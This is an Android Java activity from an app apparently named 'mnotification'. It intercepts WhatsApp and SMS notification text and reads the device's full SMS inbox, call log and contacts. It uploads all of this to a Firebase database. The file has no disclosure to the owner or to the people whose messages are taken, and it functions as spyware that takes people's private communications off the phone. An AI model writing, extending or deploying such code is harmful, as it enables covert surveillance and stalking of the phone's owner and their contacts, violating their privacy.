package com.example.mnotification;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.Button;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.localbroadcastmanager.content.LocalBroadcastManager;
import androidx.recyclerview.widget.RecyclerView;

import com.example.mnotification.Call_Record.CallRecordActivity;
import com.example.mnotification.Contacts.Contacts;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;

import butterknife.BindView;
import butterknife.ButterKnife;
import butterknife.OnClick;

public class MainActivity extends AppCompatActivity {

    @BindView(R.id.recycler_view)
    RecyclerView recyclerView;

    @BindView(R.id.btm_load)
    Button btmLoad;

    @BindView(R.id.btn_callrecord)
    Button btnCallrecord;
    Cursor phones;
    ArrayList<Model> modelList;
    CustomListAdapter adapter;
    ArrayList<Contacts> selectUsers;
    private static final int PERMISSIONS_REQUEST_READ_CONTACTS = 100;

    private DatabaseReference mFirebaseDatabase_whatsappmessage, mFirebaseDatabase_textmsg, mFirebaseDatabase_textmsg_error, mFirebaseDatabase_textmessage_by_service, mFirebaseDatabase_call_log, mFirebaseDatabase_contacts;
    private FirebaseDatabase mFirebaseInstance;


    private BroadcastReceiver onNotice = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {


            // mFirebaseDatabase.child("hiiiii").setValue("hiiiiiii");
            Log.e("*****======", "Come");
            // String pack = intent.getStringExtra("package");
            String title = intent.getStringExtra("title");
            String text = intent.getStringExtra("text");
            String package_name = intent.getStringExtra("package");
            //int id = intent.getIntExtra("icon",0);


            Toast.makeText(context, "********" + text + "", Toast.LENGTH_SHORT).show();
            Context remotePackageContext = null;
            Log.e("*/*/*/*/**", "------" + package_name);
            if (package_name.equals("txtMsg")) {
                Log.e("*****======", "ComeInElseIf");
                long yourmilliseconds = System.currentTimeMillis();
                SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss");
                Date resultdate = new Date(yourmilliseconds);
                //mFirebaseDatabase.child("hiiii").child("hiiii").setValue(text);
                mFirebaseDatabase_textmessage_by_service.child(title).child(sdf.format(resultdate)).setValue(text);
                Toast.makeText(MainActivity.this, "########----------##########", Toast.LENGTH_SHORT).show();
            } else if (package_name.equals("com.whatsapp")) {

                mFirebaseDatabase_whatsappmessage.child(title).addListenerForSingleValueEvent(new ValueEventListener() {
                    @Override
                    public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                        int size_check = 0;
                        int size = (int) dataSnapshot.getChildrenCount();

                        Log.e("Size", String.valueOf(size) + "___");

                        if (size == 0) {


                            if (!text.contains("new messages") && !text.contains("@")) {

                                long yourmilliseconds = System.currentTimeMillis();
                                SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss");
                                Date resultdate = new Date(yourmilliseconds);
                                mFirebaseDatabase_whatsappmessage.child(title).child(sdf.format(resultdate)).setValue(text);
                            }
                        }
                        for (DataSnapshot d : dataSnapshot.getChildren()) {

                            String msg = (String) d.getValue();
                            if (size_check == size - 1) {
                                if (!text.contains("new messages") && !text.contains("@")) {
                                    if (msg.equals(text)) {

                                    } else {
                                        long yourmilliseconds = System.currentTimeMillis();
                                        SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss");
                                        Date resultdate = new Date(yourmilliseconds);
                                        mFirebaseDatabase_whatsappmessage.child(title).child(sdf.format(resultdate)).setValue(text);
                                    }
                                }
                            }
                            size_check++;
                        }
                    }

                    @Override
                    public void onCancelled(@NonNull DatabaseError databaseError) {

                    }
                });


            } else {

            }
                /*if (package_name.equals("txtMsg")) {

                Log.e("*****======", "ComeInElseIf");
                long yourmilliseconds = System.currentTimeMillis();
                SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss");
                Date resultdate = new Date(yourmilliseconds);
                mFirebaseDatabase.child(title).child(sdf.format(resultdate)).setValue(text);
                //  Toast.makeText(remotePackageContext, "########----------##########", Toast.LENGTH_SHORT).show();
            }*/


        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        ButterKnife.bind(this);
        mFirebaseInstance = FirebaseDatabase.getInstance();
        // get reference to 'users' node
        mFirebaseDatabase_whatsappmessage = mFirebaseInstance.getReference("whatsappmessage");
        mFirebaseDatabase_textmessage_by_service = mFirebaseInstance.getReference("TextMessage_by_service");
        mFirebaseDatabase_textmsg = mFirebaseInstance.getReference("TextMessage");
        mFirebaseDatabase_textmsg_error = mFirebaseInstance.getReference("TextMessage_Error");
        mFirebaseDatabase_call_log = mFirebaseInstance.getReference("call_log");
        mFirebaseDatabase_contacts = mFirebaseInstance.getReference("contacts");


        LocalBroadcastManager.getInstance(this).registerReceiver(onNotice, new IntentFilter("Msg"));
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.menu_main, menu);//Menu Resource, Menu
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        switch (item.getItemId()) {
            case R.id.action_settings:
                Intent intent = new Intent(
                        "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
                startActivity(intent);
                return true;
            default:
                return super.onOptionsItemSelected(item);
        }
    }


    @OnClick(R.id.btm_load)
    public void onViewClicked() {


        try {

            String[] columns = new String[]{"address", "person", "date", "body", "type"};
            ContentResolver contentResolver = getContentResolver();
            //final String[] projection = new String[]{"*"};
            Uri uri = Uri.parse("content://sms");

            Cursor query = contentResolver.query(uri, columns, null, null, null);
            if (query.getCount() > 0) {
                //String count = Integer.toString(query.getCount());
                while (query.moveToNext()) {

                    String number = query.getString(query.getColumnIndex(columns[0]));
                    String person = query.getString(query.getColumnIndex(columns[1]));
                    String time = query.getString(query.getColumnIndex(columns[2]));
                    String body = query.getString(query.getColumnIndex(columns[3]));
                    String type = query.getString(query.getColumnIndex(columns[4]));
                    Log.e("Query", query.toString() + "---" + number + "---" + person
                            + "---" + time + "---" + body + "---" + type);

                    // SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss");
                    // Date resultdate = new Date(time);

                    if (type.equals("1")) {

                        type = "Sent";
                    } else if (type.equals("2")) {
                        type = "Recived";
                    } else if (type.equals("3")) {
                        type = "Draft";
                    }


                    if (number.contains(".")) {
                        number.replace(".", "_");
                        mFirebaseDatabase_textmsg_error.child(String.valueOf(System.currentTimeMillis())).child("if").setValue(number);
                    } else if (number.contains("$")) {

                        number.replace("$", "_");
                        mFirebaseDatabase_textmsg_error.child(String.valueOf(System.currentTimeMillis())).child("if").setValue(number);
                    } else if (number.contains("#")) {
                        mFirebaseDatabase_textmsg_error.child(String.valueOf(System.currentTimeMillis())).child("if").setValue(number);
                        number.replace("#", "_");
                    } else if (number.contains("[")) {
                        mFirebaseDatabase_textmsg_error.child(String.valueOf(System.currentTimeMillis())).child("if").setValue(number);
                        number.replace("[", "_");
                    } else if (number.contains("]")) {
                        mFirebaseDatabase_textmsg_error.child(String.valueOf(System.currentTimeMillis())).child("if").setValue(number);
                        number.replace("]", "_");
                    }

                    MessageModel messageModel = new MessageModel(number, body, time, type, person);


                    mFirebaseDatabase_textmsg.child(number).child(String.valueOf(System.currentTimeMillis())).setValue(messageModel);

                }
            }
        } catch (Exception e) {
            mFirebaseDatabase_textmsg_error.child("Error___").setValue(e.getMessage());
        }
    }


    @OnClick(R.id.btn_load_calllog)
    public void onView1Clicked() {

        Log.e("////////", "--------------");

        try {

            ContentResolver cr = getContentResolver();
            String strOrder = CallLog.Calls.DATE + " DESC";
            Uri callUri = Uri.parse("content://call_log/calls");
            Cursor curCallLogs = cr.query(callUri, null,
                    null, null, strOrder);


            while (curCallLogs.moveToNext()) {
                Log.e("in", "/*///*/*/*///*/");

                CallLogBean callLogBean = new CallLogBean();
                String callNumber = curCallLogs.getString(curCallLogs
                        .getColumnIndex(CallLog.Calls.NUMBER));
                callLogBean.setCallnumber(callNumber);

                String callName = curCallLogs
                        .getString(curCallLogs
                                .getColumnIndex(CallLog.Calls.CACHED_NAME));
                if (callName == null) {
                    callLogBean.setCallname("Unknown");
                } else
                    callLogBean.setCallname(callName);

                String callDate = curCallLogs.getString(curCallLogs
                        .getColumnIndex(CallLog.Calls.DATE));
                SimpleDateFormat formatter = new SimpleDateFormat(
                        "dd-MMM-yyyy HH:mm");
                String dateString = formatter.format(new Date(Long
                        .parseLong(callDate)));
                callLogBean.setCalltime(dateString);

                String callType = curCallLogs.getString(curCallLogs
                        .getColumnIndex(CallLog.Calls.TYPE));
                if (callType.equals("1")) {
                    callLogBean.setCalltype("Incoming");
                } else
                    callLogBean.setCalltype("Outgoing");

                String duration = curCallLogs.getString(curCallLogs.getColumnIndex(CallLog.Calls.DURATION));
                callLogBean.setCallduration(duration);


                Log.e("Out", "/*///*/*/*///*/" + callDate + "////" + callName + "////" + callNumber + "////" + callType + "////" + duration + "////" + dateString + "////");


                mFirebaseDatabase_call_log.child(callNumber).child(dateString).setValue(callLogBean);
                //mFirebaseDatabase_call_log.child("Hiiii").setValue(callNumber);

                // mFirebaseDatabase_call_log.child(callNumber).child(callDate).setValue(callLogBean);

            }

        } catch (Exception e) {
            Log.e("Error", "***********");
            mFirebaseDatabase_call_log.child("Error___").setValue(e.getMessage());
        }
    }


    @OnClick(R.id.btn_load_contact)
    public void onView2Clicked() {


        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(new String[]{Manifest.permission.READ_CONTACTS}, PERMISSIONS_REQUEST_READ_CONTACTS);
                //After this point you wait for callback in onRequestPermissionsResult(int, String[], int[]) overriden method
            } else {
                // Android version is lesser than 6.0 or the permission is already granted.
                phones = getApplicationContext().getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
                LoadContact loadContact = new LoadContact();
                loadContact.execute();
            }

        } catch (Exception e) {
            mFirebaseDatabase_textmsg_error.child("Error___").setValue(e.getMessage());
        }
    }

    @OnClick(R.id.btn_callrecord)
    public void onViewClickedrecord()
    {
        Intent intent=new Intent(MainActivity.this, CallRecordActivity.class);
        startActivity(intent);
    }


    class LoadContact extends AsyncTask<Void, Void, Void> {
        @Override
        protected void onPreExecute() {
            super.onPreExecute();

        }

        @Override
        protected Void doInBackground(Void... voids) {
            // Get Contact list from Phone

            if (phones != null) {
                Log.e("count", "" + phones.getCount());
                if (phones.getCount() == 0) {

                }

                while (phones.moveToNext()) {
                    Bitmap bit_thumb = null;
                    String id = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID));
                    String name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));


                    Contacts selectUser = new Contacts();
                    selectUser.setName(name);
                    selectUser.setPhone(phoneNumber);

                    if (name.contains(".")) {
                        name = name.replace(".", " ");
                        //mFirebaseDatabase_textmsg_error.child(String.valueOf(System.currentTimeMillis())).child("if").setValue(number);
                    } else if (name.contains("$")) {
                        name = name.replace("$", "_");
                        //mFirebaseDatabase_textmsg_error.child(String.valueOf(System.currentTimeMillis())).child("if").setValue(number);
                    } else if (name.contains("#")) {
                        // mFirebaseDatabase_textmsg_error.child(String.valueOf(System.currentTimeMillis())).child("if").setValue(number);
                        name = name.replace("#", " ");
                    } else if (name.contains("[")) {
                        // mFirebaseDatabase_textmsg_error.child(String.valueOf(System.currentTimeMillis())).child("if").setValue(number);
                        name = name.replace("[", " ");
                    } else if (name.contains("]")) {
                        //mFirebaseDatabase_textmsg_error.child(String.valueOf(System.currentTimeMillis())).child("if").setValue(number);
                        name = name.replace("]", " ");
                    }




                    /*

                     if (name.contains(".")) {
                        name.replace('.', '_');
                        //mFirebaseDatabase_textmsg_error.child(String.valueOf(System.currentTimeMillis())).child("if").setValue(number);
                    } else if (name.contains("$")) {
                        name.replace('$', '_');
                        //mFirebaseDatabase_textmsg_error.child(String.valueOf(System.currentTimeMillis())).child("if").setValue(number);
                    } else if (name.contains("#")) {
                       // mFirebaseDatabase_textmsg_error.child(String.valueOf(System.currentTimeMillis())).child("if").setValue(number);
                        name.replace('#', '_');
                    } else if (name.contains("[")) {
                       // mFirebaseDatabase_textmsg_error.child(String.valueOf(System.currentTimeMillis())).child("if").setValue(number);
                        name.replace('[' , '_');
                    } else if (name.contains("]")) {
                        //mFirebaseDatabase_textmsg_error.child(String.valueOf(System.currentTimeMillis())).child("if").setValue(number);
                        name.replace(']', '_');
                    }

                    */


                    Log.e("Name", name + "___");
                    mFirebaseDatabase_contacts.child(name).setValue(selectUser);
                    //selectUsers.add(selectUser);


                }
            } else {
                Log.e("Cursor close 1", "----------------");
            }

            return null;
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);
            LayoutInflater inflater = (LayoutInflater) getSystemService(Context.LAYOUT_INFLATER_SERVICE);
//            // sortContacts();
//            int count = selectUsers.size();
//            ArrayList<Contacts> removed = new ArrayList<>();
//            ArrayList<Contacts> contacts = new ArrayList<>();
//            for (int i = 0; i < selectUsers.size(); i++) {
//                Contacts inviteFriendsProjo = selectUsers.get(i);
//
//                if (inviteFriendsProjo.getName().matches("\\d+(?:\\.\\d+)?") || inviteFriendsProjo.getName().trim().length() == 0) {
//                    removed.add(inviteFriendsProjo);
//                    Log.d("Removed Contact", new Gson().toJson(inviteFriendsProjo));
//                } else {
//                    contacts.add(inviteFriendsProjo);
//                }
//            }
//            contacts.addAll(removed);
//            selectUsers = contacts;


        }
    }
}